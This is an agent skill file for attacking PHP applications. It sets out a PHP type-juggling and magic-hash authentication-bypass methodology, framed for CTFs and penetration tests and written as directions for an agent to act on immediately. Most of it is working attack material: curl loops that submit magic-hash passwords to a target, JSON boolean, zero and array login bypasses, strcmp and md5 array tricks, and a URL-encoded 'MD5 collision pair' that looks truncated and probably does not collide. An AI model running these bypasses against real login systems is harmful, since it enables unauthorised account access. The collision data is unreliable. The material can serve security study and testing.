---
name: php-type-juggling
description: "PHP type juggling and Magic Hash attack methodology. Use when the target is a PHP application with password comparison, hash validation, or authentication logic. Must be used when you see loose `==` comparison in PHP, MD5/SHA1 hash validation, strcmp comparison, JSON input handling, or is_numeric checks. When a failed login leaks the MD5 hash of the input, that is a strong Magic Hash signal — use this immediately. One of the most common PHP authentication bypass vulnerability classes in CTFs and penetration tests. Consider using this skill even if you only see PHP 5.x or a hash value in the response"
zh-signals: "针对 PHP 应用的类型杂耍与 Magic Hash 攻击方法论，利用松散比较、哈希校验与 strcmp 绕过认证。信号:PHP,类型杂耍,Magic Hash,松散比较,认证绕过"
when-to-use: "Use when a PHP application has password comparison, hash validation, or authentication logic using loose `==` comparison, `strcmp`, or JSON input. Covers magic hashes, array bypasses, and type juggling."
metadata:
  tags: "php,type juggling,magic hash,loose comparison,strcmp,md5,sha1,0e,authentication bypass,weak typing"
  category: "exploit"
---

# PHP Type Juggling Attack Methodology


PHP's weak type system is one of its biggest security risks. The `==` operator performs type conversion before comparing, so values that look different are judged as equal.

## Phase 0: Quick Identification (10-second check)

If you see any of the following signals, immediately suspect type juggling:

| Signal | Assessment |
|------|------|
| PHP 5.x (especially 5.6 and below) | High probability, `==` is everywhere |
| MD5/SHA1 hash of the input leaked in the error response | **Very strong signal** → Magic Hash |
| Login/authentication page with a PHP backend | Check whether it uses `==` comparison |
| JSON API accepted by a PHP backend | You can send `true`/`0`/`[]` types |
| `==`, `strcmp`, `md5()` appear in the source code | Exploit directly |
| "password incorrect" but a hash format is leaked | Magic Hash scenario |

## Phase 1: Magic Hash Attack (the most common scenario)

### How It Works

In PHP, `"0e123456" == "0e789012"` evaluates to `true`.

Because PHP treats a purely numeric string starting with `0e` as scientific notation: `0 × 10^123456 = 0`, so both sides equal `0`.

When the backend code is:
```php
if (md5($user_input) == $stored_hash) { // note: == not ===
    // authentication succeeded
}
```

As long as the MD5 of `$stored_hash` happens to be `0e` followed by only digits, the attacker only needs to input any string whose known MD5 is also `0e` followed by only digits.

### Magic Hash String Quick Reference

**MD5 magic strings** (these inputs produce an MD5 starting with `0e` followed by only digits):

| Input string | MD5 value |
|-----------|--------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536617` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240448830537924465865611904` |
| `0e215962017` | `0e291242476940776845150308577824` |

**SHA1 magic strings**:

| Input string | SHA1 value |
|-----------|---------|
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| `aaO8zKZF` | `0e89257456677279068558073954252716165668` |
| `aa3OFF9m` | `0e36977786278517984959260394024281014729` |

### Practical Steps

1. **Confirm the scenario**: password validation + PHP, especially an MD5 hash leaked on error
2. **Verify the `0e` pattern**: if the leaked "hash of the correct password" is exactly `0e[digits]`, it is 100% a Magic Hash
3. **Try every magic string**: submit them one by one using the table above

```bash
# Batch test MD5 magic strings
for pw in "240610708" "QNKCDZO" "aabg7XSs" "aabC9RqS" "s878926199a" "s155964671a" "s214587387a" "0e215962017"; do
  echo "=== Testing: $pw ==="
  curl -s -X POST "$TARGET/index.php" -d "password=$pw" | grep -i "flag\|success\|welcome\|correct\|vault"
done
```

4. **If the correct password hash is unknown**, just try them all — as long as the backend compares MD5 with `==`, any two magic strings are equivalent

> **Key insight**: you do not need to know the target password or target hash. As long as the backend uses `md5($input) == md5($stored)` and the MD5 of `$stored` happens to start with `0e`, any magic string passes.

## Phase 2: Direct Type Juggling (non-hash scenarios)

### `==` Loose Comparison Table (key combinations)

```
0 == "any_string"     → true  (PHP 5.x; fixed in PHP 8)
0 == ""               → true  (PHP 5.x)
0 == null             → true
"" == null            → true
false == ""           → true
false == 0            → true
false == null         → true
"0" == false          → true
"0" == null           → false (watch out!)
1 == "1abc"           → true  (PHP 5.x)
"php" == 0            → true  (PHP 5.x)
```

### JSON Type Injection

When PHP receives JSON input, you can bypass the comparison by sending non-string types:

```bash
# Original request (string password)
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'

# Type juggling attack: send true (bool)
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'

# Type juggling attack: send 0 (int)
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":0}'

# Type juggling attack: send an empty array
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":[]}'
```

**Principle**: `true == "any_non_empty_string"` is `true` in PHP.

### strcmp Bypass

```php
// Backend code
if (strcmp($user_input, $secret) == 0) { ... }
```

`strcmp` returns `NULL` when it receives an array argument, and `NULL == 0` is `true`:

```bash
# Send an array as a form parameter
curl -X POST "$TARGET/login.php" -d "password[]=anything"

# Send an array in JSON
curl -X POST "$TARGET/api/auth" -H "Content-Type: application/json" \
  -d '{"password":[]}'
```

### is_numeric Bypass

```php
if (is_numeric($input) && $input > 9999) { ... }
```

Hexadecimal strings are recognized as numbers by `is_numeric` in PHP 5.x:
```bash
# 0x270F = 9999
curl "$TARGET/check.php?input=0x270F"
```

## Phase 3: Hash Comparison Bypass (advanced)

### md5/sha1 Array Bypass

`md5()` and `sha1()` return `NULL` when they receive an array argument, so:

```php
// Backend
if (md5($_GET['a']) == md5($_GET['b'])) { ... }
```

```bash
# Pass arrays on both sides → md5(array) = NULL → NULL == NULL → true
curl "$TARGET/check.php?a[]=1&b[]=2"
```

### md5 Collision (bypassing `===` strict comparison)

When the backend uses `===`, both magic hashes and array tricks fail, so you need a genuine MD5 collision:

```bash
# Classic MD5 collision pair (URL-encoded binary data)
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

curl "$TARGET/check.php" --data-urlencode "a=$a" --data-urlencode "b=$b"
```

## Phase 4: PHP Version Differences

| Behavior | PHP 5.x | PHP 7.x | PHP 8.0+ |
|------|---------|---------|----------|
| `0 == "string"` | `true` | `true` | **`false`** |
| `"0e123" == "0e456"` | `true` | `true` | `true` (still!) |
| `strcmp([], "str")` | `NULL` + warning | `NULL` + warning | `TypeError` |
| `md5([])` | `NULL` + warning | `NULL` + warning | `TypeError` |
| `"0x1A" == 26` | `true` | **`false`** | `false` |
| `json_decode` type preservation | ✅ | ✅ | ✅ |

> **Important**: `0e` Magic Hash still works in PHP 8.x! Because both sides are strings, `==` still performs the scientific notation conversion.

## Decision Tree

```
Do you see PHP authentication/comparison logic?
├─ Does the error response leak an MD5 hash?
│   ├─ Hash is 0e[digits] → 100% Magic Hash, use the magic string table directly
│   └─ Hash does not start with 0e → may not be type juggling, but still try magic strings (perhaps a different password is stored)
├─ Does it accept JSON input?
│   └─ Try true/0/[]/null → JSON type juggling
├─ Form POST parameters?
│   └─ Try password[]=xxx → strcmp bypass / md5 array bypass
├─ GET parameter hash comparison?
│   └─ Try a[]=1&b[]=2 → md5/sha1 array bypass
└─ Is the source readable?
    ├─ You see == → use the matching exploitation technique
    └─ You see === → you need a real collision or a different vulnerability
```

## Notes

- A Magic Hash attack does not require knowing the target password, only that the backend compares hashes with `==`
- Everything after `0e` must be digits to trigger the scientific notation conversion (`0e1a2b` will not work)
- Try `240610708` and `QNKCDZO` first, they are the most classic
- PHP 8.0 fixed `0 == "string"` but did not fix the `"0e..." == "0e..."` magic hash
- Mark it in the penetration test report as "CWE-1025: Comparison Using Wrong Factors"

## Further Reading

- Type Juggling exploitation payloads and login bypass techniques → [references/type-juggling-exploitation.md](references/type-juggling-exploitation.md)
